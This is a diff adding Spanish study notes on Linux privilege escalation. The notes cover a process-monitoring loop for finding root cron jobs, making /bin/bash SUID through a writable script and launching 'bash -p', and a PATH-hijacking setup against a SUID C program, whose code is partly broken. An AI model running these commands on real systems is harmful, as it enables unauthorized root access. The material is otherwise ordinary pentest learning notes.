@@ -143,9 +143,71 @@ diff file1 file2
 
 
 con la ayuda del comando ps -eo command
-
 #!/bin/bash -> cabeceras
 
+old_process=$(ps -eo command)
+
+while true; do
+    new_process=$(ps -eo command)
+    # [] cualquier caracter que este en los corchete
+    # "key" cualquier linea que contenga -> con la opcion -v las elimina
+    diff  <(echo "$old_process") <(echo "$new_process") | grep "[\<\>]" | grep -v "kworker"
+    old_process=$new_process
+done
+
+al ejecutarlo, podemos ver los precesos cron que se están ejecutando, aunque sea el root el que lo haga
+
+Posteriormente si identificamos un proceso podemos ir a la ruta de donde se encuentra el fichero
+y si los permisos no estan bien configurados, podemos modificar ese script y por ejemplo
+
+chmod 4755 /bin/bash -> ponernos un permiso suid en la shell
 
 
+//Con watch podemos ver los cambios que se realizan en un fichero por ejemplo cada x segundos
+watch -d -n 1 ls -l /bin/bash
+
+
+Cuando /bin/bash se le haya aplicado el permiso suid ya podriamos lanzar una  shell
+
+bash
+bash -p -> activando el flag suid
+
+
+# explotacion de un path hijacking frente a un binario suid
+
+touch backup.sh
+
+//ruta relativa
+cat /etc/hosts
+//ruta absoluta
+which cat
+//ver el tipo de un fichero
+file /bin/cat
+/bin/cat /etc/hosts
+
+
+
+#include <stdio.h>
+void main(){
+
+    setuid(0)
+    //por ruta absoluta
+    print(\n[*] Listando procesos (/usr/bin/ps):\n\n);
+    system("/usr/bin/ps");
+
+    print(\n[*] Listando procesos (ps):\n\n);
+    system("ps");
+
+
+}
+
+Compilamos
+gcc backup.sh -o backup
+
+si le damos permisos de ejecucion
+
+chmod 4755 backup
+
+Con esto podria ejecutarlo otro usuario con el contexto que de que podemos
+ejecutar el fichero desde otros, pero nada más, ya que no tenemos permisos de escritura y no podriamos sobreescribir el fichero, además que es un ejecutable.
 
